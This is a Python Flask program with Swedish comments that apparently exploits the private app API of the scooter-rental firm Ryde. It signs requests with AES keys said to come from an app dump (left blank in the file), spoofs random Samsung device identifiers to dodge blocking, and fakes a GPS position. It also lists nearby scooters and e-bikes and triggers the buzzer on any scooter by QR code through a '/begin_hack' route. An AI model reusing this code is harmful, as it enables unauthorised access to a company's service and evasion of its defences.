# Alla bibliotek som används i programmet
from flask import Flask, render_template, request, jsonify
import requests
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.Padding import pad
import base64
import random
import threading
import time
import sys

# Initialisera flask klassen med index till mina html templates
app = Flask(__name__, template_folder='templates')

def SaveToken(token):
    with open(f"{sys.path[0]}\\bin\\token", "w") as file:
        file.write(token)
def GetToken():
    with open(f"{sys.path[0]}\\bin\\token", "r") as file:
        return file.read()
        
# AES-256 CBC krypteringsnycklarna.
# Nycklarna inkluderas inte pga. sverige rikes lag som inte är så förstående :D
ryde_iv = b'' # InitVector key från dump
ryde_key = b'' # AES main key från dump

# func: decrypt_aes_cbc
# Avkrypterar en valfri text med AES CBC mode
# args:
#   encrypted_base64: Den krypterade texten i Base64
#   key: AES nyckeln som texten är krypterad i
#   iv: AES initVec som används för extra säkerhet
# return: Avrypterad text baserad på input
def decrypt_aes_cbc(encrypted_base64, key, iv):
    # Avkoda base64 input
    ciphertext = base64.b64decode(encrypted_base64)
    
    # Skapa ett AES Cipher objekt med CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Dekryptera den krypterade texten och unpadda den
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    # Konvertera de avkrypterade bytesen till utf-8 format som är läsbart av våran konsol och kod
    # returnera resultatet
    return plaintext.decode('utf-8')

# func: encrypt_aes_cbc
# Krypterar en valfri text med AES CBC mode
# args:
#   encrypted_base64: Den krypterade texten i Base64
#   key: AES nyckeln som texten är krypterad i
#   iv: AES initVec som används för extra säkerhet
# return: Krypterad text baserad på input
def encrypt_aes_cbc(plaintext, key, iv):
    # Skapa ett AES Cipher objekt med CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Padda texten till AES block storlek
    plaintext = pad(plaintext.encode('utf-8'), AES.block_size)

    # Kryptera texten 
    ciphertext = cipher.encrypt(plaintext)

    # Koda de krypterade bytesen till base64 som är läsbart i vår konsol och konvertera till utf-8
    ciphertext_base64 = base64.b64encode(ciphertext).decode('utf-8')

    # returnera resultatet
    return ciphertext_base64

# Olika modeller på Samsung telefoner (Används för att spoofa modell i våra requests)
# Detta gör så att ryde inte kan blockera våran telefon, eftersom att det ser ut som att en annan telefon skickar
# kommunikationen varje gång vi kommunicerar med deras webb-server.
samsung_models = ["SM-N", "SM-G", "SM-A", "SM-J"]

# func: generate_samsung_model
# Genererar en fake Samsung/telefon identifier
def generate_samsung_model():
    # Väljer en random modell från listan 'samsung_models'
    prefix = random.choice(samsung_models)
    # Väljer även random modell nummer för att göra det ännu mer random
    model_number = ''.join(random.choices('0123456789', k=4))
    # Returnerar det i formatet som Ryde vill ha det
    return f"Android/samsung/{prefix}{model_number}/samsung"
    

# API länkar har raderats pga lagliga anledningar

# func: RydeAPI
# Används endast för snyggare kod, krävs inte
# args: i (index)
# return: API länken + index
def RydeAPI(i):
    return f'https://_/appRyde/{i}'

# func: RydeVIP
# Används endast för snyggare kod, krävs inte (denna är specifikt för viktiga API endpoints)
# args: i (index)
# return: API länken + index
def RydeVIP(i):
    return f'https://_/appVippsRyde/{i}'

# Sparar alla API endpoints #

# AUTH #
checkUserPhone = RydeAPI("checkUserPhone")
userLogin      = RydeAPI("userLogin")
sendSms        = RydeAPI("sendSms")

# SCOOTERS #
getScooterInfoByCode    = RydeAPI("getScooterInfoByCode")
openBuz                 = RydeAPI("openBuz")
getNearScooters         = RydeAPI("getNearScooters")

# VIP #
getAgreenments          = RydeVIP("getAgreenments")

# func: POST
# args:
#    url: Länken att göra POST request till
#    data: Datan som ska skickas med requesten
# return: Svar från servern
def POST(url, data):
    return requests.post(url, data=data)

# Index hemsidan i flask, returnerar index html filen (dashboarden)
@app.route('/')
def hello():
    return render_template('index.html')

# Vår egna API för att logga in användaren med eller utan sparad token
@app.route('/login', methods = ['GET'])
def login():
    # Om personen har en sparad token eller ej
    if len(request.args) == 0:
        # Sparad token, hämta den
        token = GetToken()
        print(f"Validating saved token: '{token}'")
        # Verifiera att den funkar
        aObj = POST(getAgreenments, {
            "token": token
        }).json()
        # Vad säger servern? Kontrollera :)
        if aObj["message"] == "ok":
            print("Token has been validated!")
            return "valid"
        else:
            print("Token is invalid :(")
            return "invalid"
    else:
        # Ingen token? Vi ska nu generera en med ditt tel-nmr!
        # Hämta tel-nmr från request params
        phone_num = request.args.get('num', type=str)
        print("number", phone_num)
    
        # Kolla om telefonnumret existerar i Rydes databas eller om det är flaggat som blacklistat
        lObj = POST(checkUserPhone, {
            "userPhone": phone_num
        })
        print(lObj.text)
        # Konvertera Ryde´s respons till JSON
        lObj = lObj.json()
        
        if lObj["message"] == "ok":
            # Kontrollera att telefonnumret är registrerat
            if lObj["isHaveUser"] != 0:
                return ("The phone number entered does not belong to a Ryde user :(")
            print("Sending SMS verification code..")
            print(phone_num)
            # Skickar en 2FA SMS till numret för att verifiera identiteten 
            sObj = POST(sendSms, {
                "userPhone": phone_num,
                "sign": encrypt_aes_cbc(phone_num, ryde_key, ryde_iv)
            }).json()
            print(sObj)
            # Har koden skickats?
            if sObj["status"] == 200 and sObj["message"] == "ok":
                return ("A verification code has been sent to the phone number you've entered.")
            else:
                if sObj["status"] == 5017:
                    return ("Invalid encryption keys.")
                return ("Failed to send verification code!")
    return "args"

# Få scooter att låta med hjälp av "code" som är identifier för varje scooter (siffran som är lagrad i scooterns qr-kod)
def Beep(code):
    # debugging :D
    print(f'[{code}] {code} was discovered')
    # Börja ljud
    buzzR = POST(openBuz, {
        "token": GetToken(),
        "qrCode": code
    }).json()
    # Kontrollera om kommandot gick igenom
    if buzzR["message"] == "ok":
        print(f'{code} has successfully received command.')
        return True
    else:
        print(f'[{code}] failed.')
        print(buzzR)
        return False

# Vilka kordinater ska programmet skanna efter scootrar?
# Returnerar longtitud och latitud
# Just nu är den på NTI Johanneberg
def RetrieveCoords():
    return "57.69031133559942", "11.974470895239794"

# API endpoint för att läsa in alla scootrar och returnera en JSON lista med deras info
@app.route('/get_scooters')
def get_scooters():
    iotLa, iotLo = RetrieveCoords()
    # nearRadius = mil
    # Skanna 0.1 mil runt kordinaterna angivna i funktioner RetrieveCoords efter scootrar.
    nearRadius = "0.1"
    # Skannar efter scootrarna
    # cityId = 32 (Göteborg)
    e_json_u = POST(getNearScooters, {
        "iotLa":          iotLa,
        "iotLo":          iotLo,
        "nearRadius":     nearRadius,
        "cityId":         "32",
    })
    # Konvertera serverns svar till json
    jObj = e_json_u.json()
    
    print(jObj)
    # Lägg scootrar och cyklar i samma lista (om man vill exploatera på båda)
    jObj["scooters"] = jObj["scooters"] + jObj["ebikes"]
    
    # skapa en ny lista
    new_list = []
    # loopa alla scootrar nära oss
    for i, v in enumerate(jObj["scooters"]):
        # Hämta scooter info
        sObj = POST(getScooterInfoByCode, data={
            "token": GetToken(), # vår token för requests
            "deviceIMEI": v["memberByString"], # memberByString: speciell identifier för scootern
            "qrCode": ""
        }).json()
        new_list.append(sObj) # Lägg till i listan

    # Returnera listan som JSON (sker automatiskt)
    return new_list

# Starta BEEP funktionen för att få en specifik scooter att tjuta/ringa
@app.route('/begin_hack')
def begin_hack():
    # Scooterns QR kod id
    code = request.args.get('code', type=str)
    # Starta funktionen och kontrollera att allt är som det ska
    if Beep(code):
        return "NICE"
    else:
        return "BAD"
        
# Rendera sidan för scootrarna
@app.route('/scooters')
def scooters():
    return render_template('scooters.html')

# Verifiera personens sms kod för att skapa en ny auth token
@app.route('/verify', methods = ['GET'])
def verify():
    # Hämta sms koden
    code = request.args.get("code", type=str)
    # Hämta tel-nmr
    phone_num = request.args.get("num", type=str)
    # Kontrollera om koden är OK
    tObj = POST(userLogin, {
        "userPhone":      phone_num,
        "smsCode":        code,
        "phoneInfo":      f"{generate_samsung_model()}(7.1.3,25)/App:4.2.3", # Fake tel id
        "gpsLa":          "57.706257", # Vilka kordinater som helst fungerar så länge det är i Göteborg
        "gpsLo":          "11.970522", # Vilka kordinater som helst fungerar så länge det är i Göteborg
        "mobileType":     generate_samsung_model() # Fake samsung modell
    }).json()
    # Är koden rätt?
    if tObj["status"] == 208:
        print("Invalid code") # NEJ
    else:
        # Kanske :/
        if tObj["message"] == "ok": # YES
            print("The verification code is valid.")
            token = tObj["token"]
            print("Saving token..")
            # Sparar auth token!
            SaveToken(token)
            print("Token has been saved")
            # Returnera token till client
            return (f"Secure token: {token}")
        elif tObj["message"] == "Verification code or phone number is wrong.": # Nah
            print("Invalid verification code!")
            return ("Failed to verify account.")
        else: # Krypteringsnycklarna är förmodligen fel ;D
            print("Unknown error while verifying the SMS auth code.")
            return ("Failed to verify account. (2)")
    
# Starta flask hemsidan på localhost
app.run(host='0.0.0.0', port=3000)